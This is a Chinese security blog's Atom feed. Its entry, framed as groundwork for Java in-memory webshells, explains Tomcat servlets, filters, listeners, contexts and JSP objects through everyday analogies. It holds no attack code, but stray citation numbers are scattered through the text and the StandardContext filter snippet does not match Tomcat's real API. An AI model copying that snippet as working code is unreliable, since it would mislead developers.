<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Gu0f3n&#39;s blog</title>
  
  <subtitle>邮电部诗人</subtitle>
  <link href="https://gu0f3n.github.io/atom.xml" rel="self"/>
  
  <link href="https://gu0f3n.github.io/"/>
  <updated>2025-03-29T10:11:48.907Z</updated>
  <id>https://gu0f3n.github.io/</id>
  
  <author>
    <name>Gu0f3n</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>java内存马基础</title>
    <link href="https://gu0f3n.github.io/2025/03/28/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%9F%BA%E7%A1%80/"/>
    <id>https://gu0f3n.github.io/2025/03/28/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%9F%BA%E7%A1%80/</id>
    <published>2025-03-28T06:38:44.000Z</published>
    <updated>2025-03-29T10:11:48.907Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Java-Web-三大件"><a href="#Java-Web-三大件" class="headerlink" title="Java Web 三大件"></a>Java Web 三大件</h2><p>Java Web 三大件，也就是 Servlet，Filter，Listener</p><p>当 Tomcat 接收到请求时候，依次会经过 Listener -&gt; Filter -&gt; Servlet</p><h1 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h1><ul><li><a href="https://www.cnblogs.com/fwnboke/p/9119244.html">https://www.cnblogs.com/fwnboke/p/9119244.html</a></li></ul><p>这里简单总结下</p><p>我尽量用大白话解释一下这个链接里的内容：</p><ol><li><strong>Servlet是什么</strong>：</li></ol><ul><li>你可以把Servlet理解成”服务员”，专门处理网站的各种请求。比如你点外卖（发送请求），服务员（Servlet）接单后去厨房（服务器）做好，再打包（生成网页）送给你。</li></ul><ol><li><strong>Servlet的工作场景</strong>：</li></ol><ul><li>动态生成网页（比如淘宝的商品页面，每个人看到的都不一样）</li><li>把请求转交给其他”服务员”处理（像餐厅里服务员之间交接工作）</li><li>连接数据库（比如查你的快递信息）</li><li>读取客户的小纸条（Cookie）</li></ul><ol><li><strong>四个重要工具</strong>：</li></ol><ul><li><strong>请求单子（HttpServletRequest）</strong>：记录客户的所有要求（比如搜索关键词）</li><li><strong>回复盒子（HttpServletResponse）</strong>：用来打包要返回给客户的东西</li><li><strong>个人工作牌（ServletConfig）</strong>：每个服务员独有的配置（比如专属的调料配方）</li><li><strong>餐厅公告板（ServletContext）</strong>：所有服务员共享的信息（比如今日特价菜）</li></ul><ol><li><strong>服务员的工作流程</strong>：</li></ol><ul><li>上班签到（init()）：第一次被叫时做准备</li><li>处理订单（service()）：根据客户要求（GET&#x2F;POST）选择处理方法</li><li>下班收工（destroy()）：关灯关煤气，收拾东西</li></ul><ol><li><strong>两种上班方式</strong>：</li></ol><ul><li>有客人叫才起床（默认）</li><li>提前到岗待命（配置load-on-startup，数字越小越早上班）</li></ul><ol><li><strong>配置小窍门</strong>：</li></ol><ul><li>整个餐厅的配置用（比如统一打8折）</li><li>个人配置用（比如某服务员专属的围裙颜色）</li><li>现在流行用@WebInitParam这种贴标签的方式配置（类似便利贴）</li></ul><ol><li><strong>常用小功能</strong>：</li></ol><ul><li>获取客户要求：request.getParameter()（比如查快递单号）</li><li>设置返回格式：response.setContentType()（告诉浏览器返回的是网页还是图片）</li><li>存取临时数据：request.setAttribute()（像服务员之间传递小纸条）</li></ul><p>简单来说，Servlet就是网站后台的”服务员团队”，负责接收用户请求、处理数据、生成网页，最后把结果返回给用户浏览器的整个过程。这些服务员们各司其职，有的专门处理登录，有的专门处理支付，共同维持网站的正常运作。</p><h1 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><p><a href="https://blog.csdn.net/qq_53287512/article/details/129278148">https://blog.csdn.net/qq_53287512/article/details/129278148</a></p><p><strong>Tomcat 就像是一个“Java网站服务员”</strong><br>你可以把它想象成餐厅里专门负责接待顾客的服务员。当你用 Java 写了一个网站（比如一个购物网站），Tomcat 的作用就是：</p><ol><li><strong>接电话</strong>：<br>当用户用浏览器访问你的网站（比如输入网址），Tomcat 会第一时间“接电话”，听懂用户想要什么（比如打开首页、提交订单）。</li><li><strong>喊厨师干活</strong>：<br>Tomcat 自己不会处理复杂的业务（比如计算价格、查数据库），但它会喊你写的 Java 代码（比如 Servlet）来干活，就像服务员把订单传给后厨。</li><li><strong>上菜</strong>：<br>等 Java 代码处理完数据，Tomcat 会把结果（比如生成的网页、数据）打包好，“端”回给用户的浏览器。</li></ol><p><strong>为什么需要 Tomcat？</strong></p><ul><li>没有它，你的 Java 代码就像不会接客的厨师，空有功能但没人能用。</li><li>它帮你处理了网络通信、多线程等复杂问题，你只需要专注写业务逻辑。</li></ul><p><strong>日常比喻</strong></p><ul><li><p>安装 Tomcat ≈ 雇一个服务员</p></li><li><p>部署网站 ≈ 把菜谱交给服务员</p></li><li><p>启动 Tomcat ≈ 让服务员开始上班接客</p></li><li><p>端口冲突 ≈ 服务员抢了别人的对讲机频道（比如默认用 8080 端口）</p><h2 id="Tomcat-中的三个-Context-的理解"><a href="#Tomcat-中的三个-Context-的理解" class="headerlink" title="Tomcat 中的三个 Context 的理解"></a>Tomcat 中的三个 Context 的理解</h2><ul><li><p>Context：代表一个web应用，一个应用可以有多个Context，<strong>Context 就是代码的“剧组场记”</strong> —— 它记住所有环境细节，让每个组件（Servlet&#x2F;Filter）不用自己带剧本，走到哪都能立刻入戏！</p><p><strong>Context 就是「当前环境的所有信息」</strong>，相当于拍电影时导演喊卡后，对演员说：<strong>“你刚刚是在被追杀时喊‘奥利给’，不是吃饭时喊的！”</strong> —— 这个“被追杀”的背景就是 Context。</p><h3 id="Java-中的-ServletContext-是什么？"><a href="#Java-中的-ServletContext-是什么？" class="headerlink" title="Java 中的 ServletContext 是什么？"></a><strong>Java 中的 ServletContext 是什么？</strong></h3><p><strong>ServletContext 就是整个 Web 应用的“剧组档案库”</strong>，它保存着这个 Web 应用的所有“拍摄信息”(大概就是规定了如果要实现一个WEB容器，他的Context里面要有这些东西：获取路径，获取参数，获取当前的filter，获取当前的servlet等)：</p><p><strong>全局道具清单</strong>（全局参数）</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 存：setAttribute(&quot;道具名&quot;, 道具)</span></span><br><span class="line">context.setAttribute(<span class="string">&quot;database_url&quot;</span>, <span class="string">&quot;jdbc:mysql://localhost:3306/mydb&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 取：getAttribute(&quot;道具名&quot;)</span></span><br><span class="line"><span class="type">String</span> <span class="variable">dbUrl</span> <span class="operator">=</span> (String) context.getAttribute(<span class="string">&quot;database_url&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul></li></ul><p><strong>演员名单</strong>（Servlet&#x2F;Filter&#x2F;Listener 配置）</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 动态添加一个“群演”（Servlet）</span></span><br><span class="line">ServletRegistration.<span class="type">Dynamic</span> <span class="variable">servlet</span> <span class="operator">=</span> context.addServlet(<span class="string">&quot;MyServlet&quot;</span>, MyServlet.class);</span><br><span class="line">servlet.addMapping(<span class="string">&quot;/my-url&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>拍摄场地地图</strong>（资源路径）</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取文件在服务器上的真实路径（比如找剧本文件）</span></span><br><span class="line"><span class="type">String</span> <span class="variable">realPath</span> <span class="operator">=</span> context.getRealPath(<span class="string">&quot;/WEB-INF/config.xml&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="StandardContext"><a href="#StandardContext" class="headerlink" title="StandardContext"></a>StandardContext</h3><hr><h3 id="StandardContext-是什么？"><a href="#StandardContext-是什么？" class="headerlink" title="StandardContext 是什么？"></a><strong>StandardContext 是什么？</strong></h3><p><strong>StandardContext 就是 Tomcat 的「包裹处理中枢」</strong>，它负责：</p><ol><li><strong>管理所有快递员（Servlet&#x2F;Filter&#x2F;Listener）</strong>：记录每个快递员负责的区域（URL 路径）和操作规范（配置）</li><li><strong>监控包裹（请求）流转</strong>：从快递车（HTTP 请求）到达分拣中心开始，到包裹派送完成（响应返回）的全流程</li><li><strong>处理突发事件</strong>：比如包裹破损（请求错误）、超重（请求数据过大）等情况</li></ol><hr><h3 id="具体功能大白话版"><a href="#具体功能大白话版" class="headerlink" title="具体功能大白话版"></a><strong>具体功能大白话版</strong></h3><ol><li><p><strong>包裹登记处</strong></p><ul><li><p>每个新到的快递（Web 应用）都要在这里注册信息，比如：</p><ul><li><p>📦 包裹类型：是文件（静态资源）还是生鲜（动态请求）？</p><p><strong>2</strong></p></li><li><p>📦 派送规则：哪些快递员（Servlet）处理哪些区域的包裹？</p><p><strong>2</strong></p></li></ul></li></ul></li><li><p><strong>快递员调度中心</strong></p><ul><li><p>管理三大类工作人员：</p><ul><li><p>🚚 </p><p>卸货组（Listener）</p><p>：包裹刚到分拣中心时检查外包装（请求初始化）</p><hr></li><li><p>🔍 <strong>分拣组（Filter）</strong>：给包裹贴标签、消毒（参数处理&#x2F;安全检查）</p></li><li><p>🚛 <strong>派送组（Servlet）</strong>：把包裹送到正确地址（生成响应）</p></li></ul></li></ul></li><li><p><strong>异常处理机制</strong></p><ul><li><p>如果发现危险品（恶意请求），会启动：</p><ul><li><p>🔒 自动拦截（返回 403 错误）</p></li><li><p>📢 触发警报（记录日志&#x2F;通知管理员）</p><hr></li></ul></li></ul></li></ol><hr><h3 id="和-ApplicationContext-的区别-6"><a href="#和-ApplicationContext-的区别-6" class="headerlink" title="和 ApplicationContext 的区别****6"></a><strong>和 ApplicationContext 的区别****6</strong></h3><table><thead><tr><th align="center"></th><th align="center">StandardContext（快递分拣中心）</th><th align="center">ApplicationContext（智能中央厨房）</th></tr></thead><tbody><tr><td align="center"><strong>所属系统</strong></td><td align="center">Tomcat 专属</td><td align="center">Spring 框架专属</td></tr><tr><td align="center"><strong>主要功能</strong></td><td align="center">管理 Web 应用的请求处理流程</td><td align="center">管理 Spring Bean 和依赖注入</td></tr><tr><td align="center"><strong>数据存储</strong></td><td align="center">存 Servlet&#x2F;Filter 配置</td><td align="center">存业务对象和组件关系</td></tr><tr><td align="center"><strong>典型操作</strong></td><td align="center">添加监听器、配置错误页面</td><td align="center">加载配置文件、管理事务</td></tr></tbody></table><hr><h3 id="实际开发中的存在感"><a href="#实际开发中的存在感" class="headerlink" title="实际开发中的存在感"></a><strong>实际开发中的存在感</strong></h3><p>当你在 Tomcat 的 <code>conf/server.xml</code> 里写这样的配置时：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Context</span> <span class="attr">path</span>=<span class="string">&quot;/shop&quot;</span> <span class="attr">docBase</span>=<span class="string">&quot;D:\myapp&quot;</span> <span class="attr">reloadable</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>背后的 <strong>StandardContext</strong> 就会：</p><ol><li>📂 把 <code>D:\myapp</code> 文件夹识别为「shop 专区」</li><li>🔄 开启自动监控（reloadable），文件改动时自动刷新</li><li>🛡️ 给这个专区分配独立的安全策略（比如单独的登录验证）</li></ol><hr><h3 id="一句话总结"><a href="#一句话总结" class="headerlink" title="一句话总结"></a><strong>一句话总结</strong></h3><p><strong>StandardContext 就是 Tomcat 的「分拣中心主管」</strong>，它知道：</p><ul><li>每个包裹（请求）该走哪条流水线 🚚</li><li>所有工作人员（Servlet&#x2F;Filter）的排班表 📅</li><li>遇到突发状况时该启动哪套应急预案 🚨</li></ul><p>没有它，Tomcat 就像没有调度系统的快递站，包裹会乱成一锅粥！</p><h3 id="一、三种-Context-的关系与角色"><a href="#一、三种-Context-的关系与角色" class="headerlink" title="一、三种 Context 的关系与角色"></a><strong>一、三种 Context 的关系与角色</strong></h3><table><thead><tr><th align="center"></th><th align="center"><strong>ServletContext</strong></th><th align="center"><strong>ApplicationContext</strong></th><th align="center"><strong>StandardContext</strong></th></tr></thead><tbody><tr><td align="center"><strong>身份定位</strong></td><td align="center">官方菜单（规范）<strong>3</strong></td><td align="center">前台接待（门面）<strong>2****3</strong></td><td align="center">后厨主管（实际干活）<strong>2****6</strong></td></tr><tr><td align="center"><strong>职责</strong></td><td align="center">规定餐厅要有哪些功能（接口）</td><td align="center">对外隐藏后厨细节，只展示规范功能</td><td align="center">实际安排厨师、备菜、处理订单</td></tr><tr><td align="center"><strong>存在感</strong></td><td align="center">顾客看不见，但所有菜品都按它制作</td><td align="center">服务员拿菜单给顾客看</td><td align="center">在厨房里吼着调度人员</td></tr></tbody></table><hr><h3 id="二、具体功能大白话版"><a href="#二、具体功能大白话版" class="headerlink" title="二、具体功能大白话版"></a><strong>二、具体功能大白话版</strong></h3><h4 id="1-ServletContext-——-官方《餐饮业标准菜单》"><a href="#1-ServletContext-——-官方《餐饮业标准菜单》" class="headerlink" title="1. ServletContext —— 官方《餐饮业标准菜单》"></a><strong>1. ServletContext —— 官方《餐饮业标准菜单》</strong></h4><p>- </p><p>  作用</p><p>  ：国家规定所有餐厅必须支持的功能，比如：</p><ul><li><p>📜 <strong>必须能查菜品价格</strong> → <code>getInitParameter(&quot;折扣&quot;)</code></p></li><li><p>📜 <strong>必须有服务员名单</strong> → <code>getServletRegistrations()</code></p></li><li><p>📜 <strong>必须能记录客流量</strong> → <code>setAttribute(&quot;今日客流&quot;, 1000)</code></p></li><li><p>特点</p><p>：</p><ul><li><p>所有餐厅（Web 应用）都必须遵守这套规范</p><p><strong>3</strong></p></li><li><p>顾客（开发者）看不到它，但菜单（功能）都是它规定的</p></li></ul></li></ul><h4 id="2-ApplicationContext-——-餐厅前台服务员"><a href="#2-ApplicationContext-——-餐厅前台服务员" class="headerlink" title="2. ApplicationContext —— 餐厅前台服务员"></a><strong>2. ApplicationContext —— 餐厅前台服务员</strong></h4><p>- </p><p>  作用</p><p>  ：把复杂的后厨操作包装成简单指令，比如：</p><ul><li><p>🧑🍳 <strong>加新菜</strong> → <code>addServlet(&quot;麻辣香锅&quot;, SpicyPot.class)</code></p></li><li><p>🧹 <strong>换餐具</strong> → <code>addFilter(&quot;消毒过滤器&quot;, DisinfectionFilter.class)</code></p></li><li><p>特点</p><p>：</p><ul><li><p>对顾客（开发者）隐藏了后厨切菜、炒菜的过程（底层 StandardContext 的复杂操作）</p><p><strong>2</strong></p></li><li><p>本质是 StandardContext 的“马甲”（门面模式）</p><p><strong>3</strong></p></li></ul></li></ul><h4 id="3-StandardContext-——-暴躁后厨主管"><a href="#3-StandardContext-——-暴躁后厨主管" class="headerlink" title="3. StandardContext —— 暴躁后厨主管"></a><strong>3. StandardContext —— 暴躁后厨主管</strong></h4><p>- </p><p>  实际干活</p><p>  ：</p><ul><li><p>📌 <strong>管理所有厨师</strong>（Servlet&#x2F;Filter&#x2F;Listener）的排班表</p></li><li><p>📌 </p><p>监控订单流程</p><p>：从接单到上菜的每个环节（Pipeline-Valve 责任链）</p><p><strong>6</strong></p></li><li><p>📌 <strong>处理突发状况</strong>：比如食材不足（请求错误）时启动备用方案</p></li><li><p>配置方式</p><p>（三种后厨管理模式）：</p><ul><li><p>📂 </p><p>默认模式</p><p>：把菜谱（WAR 包）丢进固定柜子（webapps 目录），自动识别</p><p><strong>4</strong></p></li><li><p>📝 </p><p>手写模式</p><p>：在总账本（server.xml）里写死菜单，重启生效</p><p><strong>4</strong></p></li><li><p>🗒️ </p><p>便利贴模式</p><p>：在厨房墙上贴便利贴（conf&#x2F;Catalina 目录下的 XML），随时修改</p><p><strong>4</strong></p><p><strong>6</strong></p></li></ul></li></ul><hr><h3 id="三、实际开发中的经典场景"><a href="#三、实际开发中的经典场景" class="headerlink" title="三、实际开发中的经典场景"></a><strong>三、实际开发中的经典场景</strong></h3><h4 id="场景-1：统计全站访问量"><a href="#场景-1：统计全站访问量" class="headerlink" title="场景 1：统计全站访问量"></a><strong>场景 1：统计全站访问量</strong></h4><p>java</p><p>复制</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 用 ServletContext 存全局计数</span></span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">context</span> <span class="operator">=</span> getServletContext();</span><br><span class="line">context.setAttribute(<span class="string">&quot;visit_count&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 每次访问时 +1</span></span><br><span class="line"><span class="keyword">synchronized</span>(context) &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> (<span class="type">int</span>) context.getAttribute(<span class="string">&quot;visit_count&quot;</span>);</span><br><span class="line">    context.setAttribute(<span class="string">&quot;visit_count&quot;</span>, count + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="场景-2：动态添加接口"><a href="#场景-2：动态添加接口" class="headerlink" title="场景 2：动态添加接口"></a><strong>场景 2：动态添加接口</strong></h4><p>java</p><p>复制</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过 ApplicationContext 加新功能</span></span><br><span class="line">ServletRegistration.<span class="type">Dynamic</span> <span class="variable">servlet</span> <span class="operator">=</span> context.addServlet(<span class="string">&quot;ApiServlet&quot;</span>, ApiServlet.class);</span><br><span class="line">servlet.addMapping(<span class="string">&quot;/api/*&quot;</span>);</span><br></pre></td></tr></table></figure><h4 id="场景-3：紧急封禁-IP"><a href="#场景-3：紧急封禁-IP" class="headerlink" title="场景 3：紧急封禁 IP"></a><strong>场景 3：紧急封禁 IP</strong></h4><p>java</p><p>复制</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 操作 StandardContext 加黑名单过滤器</span></span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">stdContext</span> <span class="operator">=</span> (StandardContext) request.getContext(); <span class="comment">// 获取后厨主管</span></span><br><span class="line">stdContext.addFilter(<span class="keyword">new</span> <span class="title class_">FilterDef</span>(<span class="keyword">new</span> <span class="title class_">IpBlockFilter</span>())); <span class="comment">// 塞个过滤器给他</span></span><br></pre></td></tr></table></figure><hr><h3 id="四、一句话总结"><a href="#四、一句话总结" class="headerlink" title="四、一句话总结"></a><strong>四、一句话总结</strong></h3><ul><li><strong>ServletContext</strong> 是行业标准（菜单必须有哪些菜）</li><li><strong>ApplicationContext</strong> 是服务员（按标准给顾客点菜）</li><li><strong>StandardContext</strong> 是后厨（实际炒菜、处理订单）</li></ul><p>三者就像餐厅的 <strong>「标准 → 接口 → 实现」</strong>，共同保证 Tomcat 能高效处理每个请求！</p><h1 id="TomCat与Servlet的关系"><a href="#TomCat与Servlet的关系" class="headerlink" title="TomCat与Servlet的关系"></a>TomCat与Servlet的关系</h1><p><a href="https://blog.csdn.net/weixin_46225503/article/details/135307399">https://blog.csdn.net/weixin_46225503/article/details/135307399</a></p><p><strong>想象一个餐厅：</strong></p><ul><li><strong>Tomcat</strong> 就像餐厅的前台和传菜员。它负责接待客人（接收浏览器发来的请求），安排座位（管理网络连接），然后把客人点的菜单交给后厨（Servlet），最后把做好的菜端回给客人（把处理结果返回给浏览器）。</li><li><strong>Servlet</strong> 就像后厨的厨师。它不直接和客人打交道，但拿到菜单（HTTP请求）后，负责按需求炒菜（处理业务逻辑，比如登录、查询数据），然后把炒好的菜（生成的HTML页面或数据）交给传菜员（Tomcat）。</li></ul><hr><p><strong>具体关系：</strong></p><ol><li><strong>Tomcat 是 Servlet 的“运行环境”</strong><br>就像手机需要安卓&#x2F;iOS系统才能运行APP一样，Servlet 必须放在 Tomcat 这类“容器”里才能工作。Tomcat 负责管理 Servlet 的创建、调用和销毁。</li><li><strong>分工明确</strong><ul><li><strong>Tomcat 干粗活</strong>：处理网络通信（监听端口、解析HTTP协议）、多线程管理、安全性等底层细节。</li><li><strong>Servlet 干细活</strong>：专注写业务逻辑（比如用户注册、数据查询），不用管网络怎么传数据。</li></ul></li><li><strong>协作流程</strong><br>当你在浏览器输入网址时：<ul><li>Tomcat 先接收到请求，分析要找哪个 Servlet（比如处理登录的 LoginServlet）。</li><li>Tomcat 调用对应的 Servlet，把请求信息（参数、请求头等）传给它。</li><li>Servlet 处理完，把结果（比如生成的HTML页面）交给 Tomcat。</li><li>Tomcat 把结果包装成HTTP响应，发回给浏览器。</li></ul></li></ol><hr><p><strong>一句话总结：</strong><br>Tomcat 是 Servlet 的“服务员+管家”，Servlet 是 Tomcat 的“打工人”。没有 Tomcat，Servlet 无法独立工作；没有 Servlet，Tomcat 只是个空壳。</p><h1 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h1><p>Filter（过滤器）就像是你在网上点外卖时候的”中间商”。比如你下单后，外卖小哥送餐前会先检查你的订单是否正常，有没有违禁品，或者给你的餐盒加个保温袋，这就相当于过滤器的作用。</p><p>JavaWeb 的三大管家：</p><ol><li>Servlet：负责处理请求（像餐厅后厨）</li><li>Filter：负责检查&#x2F;加工请求和响应（像外卖打包员）</li><li>Listener：负责监听事件（像监控摄像头）</li></ol><p>过滤器具体能干这些事：</p><ul><li>请求到达服务器前：可以检查用户是否登录（像进小区要刷卡）</li><li>服务器处理请求时：可以给请求数据消毒（像给快递消毒）</li><li>服务器返回响应时：可以压缩数据（像快递打包）</li><li>返回给用户前：可以屏蔽敏感词（像自动打马赛克）</li></ul><p>举个例子：<br>比如你写了个论坛网站，用过滤器可以：</p><ol><li>自动把用户发的脏话替换成***</li><li>检查用户是否登录才能发帖</li><li>记录每个访问的IP地址</li><li>给网页内容自动加上防拷贝水印</li></ol><p>代码示例理解：<br>就像你雇了个保安（Filter），每个访客（请求）进公司（服务器）之前，保安会检查工牌（登录状态）。如果检查通过，就放行（chain.doFilter）；如果没工牌，就拦在门外（跳转到登录页）。</p><p>整个过程就像流水线加工：<br>浏览器 → 过滤器1（比如检查登录）→ 过滤器2（比如记录日志）→ 服务器处理 → 过滤器3（比如压缩数据）→ 返回给浏览器</p><p>最大的好处是：不用改网站原有代码，就能批量增加各种安全检查和附加功能，就像给手机装各种滤镜APP一样方便。</p><h1 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h1><hr><h3 id="Listener-大白话解释"><a href="#Listener-大白话解释" class="headerlink" title="Listener 大白话解释"></a><strong>Listener 大白话解释</strong></h3><p><strong>Listener 就像快递站的「自动监控系统」</strong>，它不直接处理快递（请求&#x2F;响应），但能自动感知快递站里发生的各种事件，比如：</p><ul><li>📦 <strong>有人来取件</strong>（用户创建了会话）</li><li>📦 <strong>快递被退回</strong>（用户关闭了浏览器）</li><li>📦 <strong>快递站开门&#x2F;关门</strong>（服务器启动&#x2F;关闭）</li><li>📦 <strong>货架上的包裹被移动</strong>（数据被修改）</li></ul><p><strong>只要这些事件发生，监听器就会自动触发对应的操作</strong>，比如发短信通知你、更新库存、记录日志等等。</p><hr><h3 id="举个实际例子"><a href="#举个实际例子" class="headerlink" title="举个实际例子"></a><strong>举个实际例子</strong></h3><p><strong>场景</strong>：你想统计网站的在线人数<br><strong>用 Listener 怎么做</strong>：</p><ol><li><strong>当用户登录时</strong>（创建了一个 Session），自动给在线人数 +1</li><li><strong>当用户退出或 Session 过期时</strong>，自动给在线人数 -1</li><li><strong>当服务器重启时</strong>，自动清零在线人数</li></ol><p><strong>全程不需要你手动写代码去统计</strong>，监听器像个小雷达一样自动帮你盯着这些事件！</p><hr><h3 id="Listener-能监听哪些事？"><a href="#Listener-能监听哪些事？" class="headerlink" title="Listener 能监听哪些事？"></a><strong>Listener 能监听哪些事？</strong></h3><p>1. </p><p>   服务器级别</p><p>   ：</p><ul><li>服务器启动（比如加载数据库配置）</li><li>服务器关闭（比如保存未处理完的数据）</li></ul><p>2. </p><p>   用户会话（Session）级别</p><p>   ：</p><ul><li>用户第一次访问（创建 Session）</li><li>用户关闭浏览器（销毁 Session）</li></ul><p>3. </p><p>   数据变化</p><p>   ：</p><ul><li>某个数据被添加、修改、删除（比如购物车商品变化）</li></ul><hr><h3 id="Listener-vs-Filter-区别"><a href="#Listener-vs-Filter-区别" class="headerlink" title="Listener vs Filter 区别"></a><strong>Listener vs Filter 区别</strong></h3><ul><li>🔧 <strong>Filter（过滤器）</strong>：像保安，<strong>主动检查</strong>每个进出的人（请求&#x2F;响应），不通过就拦下。</li><li>📡 <strong>Listener（监听器）</strong>：像监控摄像头，<strong>被动感知</strong>事件发生，默默执行后台任务。</li></ul><hr><h3 id="一句话总结-1"><a href="#一句话总结-1" class="headerlink" title="一句话总结"></a><strong>一句话总结</strong></h3><p><strong>Listener 就是给服务器装了个「智能感应器」</strong>，它能自动感知各种事件，并在背后帮你干活，就像你家的智能家居自动开灯关灯一样省心！</p><h1 id="JSP-基础"><a href="#JSP-基础" class="headerlink" title="JSP 基础"></a>JSP 基础</h1><p>JSP（Java Server Pages），是Java的一种动态网页技术。在早期Java的开发技术中，Java程序员如果想要向浏览器输出一些数据，就必须得手动<code>println</code>一行行的HTML代码。为了解决这一繁琐的问题，Java开发了JSP技术。</p><p>JSP可以看作一个Java Servlet，主要用于实现Java web应用程序的用户界面部分。网页开发者们通过结合HTML代码、XHTML代码、XML元素以及嵌入JSP操作和命令来编写JSP。</p><p>当第一次访问JSP页面时，Tomcat服务器会将JSP页面翻译成一个java文件，并将其编译为.class文件。JSP通过网页表单获取用户输入数据、访问数据库及其他数据源，然后动态地创建网页。</p><h3 id="JSP内置对象"><a href="#JSP内置对象" class="headerlink" title="JSP内置对象"></a>JSP内置对象</h3><p>JSP有九大内置对象，他们能够在客户端和服务器端交互的过程中分别完成不同的功能。其特点如下</p><ul><li><p>由 JSP 规范提供，不用编写者实例化</p></li><li><p>通过 Web 容器实现和管理</p></li><li><p>所有 JSP 页面均可使用</p></li><li><p>只有在脚本元素的表达式或代码段中才能使用</p></li><li></li><li><table><thead><tr><th>对 象</th><th>类型</th><th>说 明</th></tr></thead><tbody><tr><td><a href="https://drun1baby.top/jsp2/request.html">request</a></td><td>javax.servlet.http.HttpServletRequest</td><td>获取用户请求信息</td></tr><tr><td><a href="https://drun1baby.top/jsp2/response.html">response</a></td><td>javax.servlet.http.HttpServletResponse</td><td>响应客户端请求，并将处理信息返回到客户端</td></tr><tr><td><a href="https://drun1baby.top/jsp2/out.html">out</a></td><td>javax.servlet.jsp.JspWriter</td><td>输出内容到 HTML 中</td></tr><tr><td><a href="https://drun1baby.top/jsp2/session.html">session</a></td><td>javax.servlet.http.HttpSession</td><td>用来保存用户信息</td></tr><tr><td><a href="https://drun1baby.top/jsp2/application.html">application</a></td><td>javax.servlet.ServletContext</td><td>所有用户共享信息</td></tr><tr><td><a href="https://drun1baby.top/jsp2/config.html">config</a></td><td>javax.servlet.ServletConfig</td><td>这是一个 Servlet 配置对象，用于 Servlet 和页面的初始化参数</td></tr><tr><td><a href="https://drun1baby.top/jsp2/pagecontext.html">pageContext</a></td><td>javax.servlet.jsp.PageContext</td><td>JSP 的页面容器，用于访问 page、request、application 和 session 的属性</td></tr><tr><td><a href="https://drun1baby.top/jsp2/page_object.html">page</a></td><td>javax.servlet.jsp.HttpJspPage</td><td>类似于 Java 类的 this 关键字，表示当前 JSP 页面</td></tr><tr><td><a href="https://drun1baby.top/jsp2/page.html">exception</a></td><td>java.lang.Throwable</td><td>该对象用于处理 JSP 文件执行时发生的错误和异常；只有在 JSP 页面的 page 指令中指定 isErrorPage 的取值 true 时，才可以在本页面使用 exception 对象。</td></tr></tbody></table></li></ul><p>from:<a href="https://drun1baby.top/2022/08/19/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-01-%E5%9F%BA%E7%A1%80%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0/">https://drun1baby.top/2022/08/19/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-01-%E5%9F%BA%E7%A1%80%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Java-Web-三大件&quot;&gt;&lt;a href=&quot;#Java-Web-三大件&quot; class=&quot;headerlink&quot; title=&quot;Java Web 三大件&quot;&gt;&lt;/a&gt;Java Web 三大件&lt;/h2&gt;&lt;p&gt;Java Web 三大件，也就是 Servlet，Filte</summary>
      
    
    
    
    <category term="java" scheme="https://gu0f3n.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://gu0f3n.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>常见安全设备总结</title>
    <link href="https://gu0f3n.github.io/2025/03/27/%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%80%BB%E7%BB%93%E2%80%9C/"/>
    <id>https://gu0f3n.github.io/2025/03/27/%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%80%BB%E7%BB%93%E2%80%9C/</id>
    <published>2025-03-27T09:33:03.000Z</published>
    <updated>2025-03-27T11:25:01.390Z</updated>
    
